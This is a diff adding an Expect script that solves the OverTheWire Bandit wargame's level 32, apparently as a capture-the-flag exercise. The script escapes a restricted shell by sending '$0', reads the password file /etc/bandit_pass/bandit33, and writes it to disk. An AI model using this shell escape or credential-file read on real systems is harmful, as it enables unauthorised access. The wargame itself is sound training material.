@@ -1,0 +1,29 @@
+#!/usr/bin/expect
+
+set prevLevelPassword [lindex $argv 0]
+
+spawn sshpass -p $prevLevelPassword ssh bandit32@bandit.labs.overthewire.org -p 2220
+
+expect ">> "
+
+# The variable $0 has a reference to a shell
+send "\$0\r" 
+
+expect "$ "
+
+send "cat /etc/bandit_pass/bandit33\r"
+
+expect "$ "
+set bandit33_password $expect_out(buffer)
+
+send "exit\r"
+
+expect ">> "
+
+send \x03
+
+set fh [open bandit33 w]
+puts $fh $bandit33_password
+close $fh
+
+interact
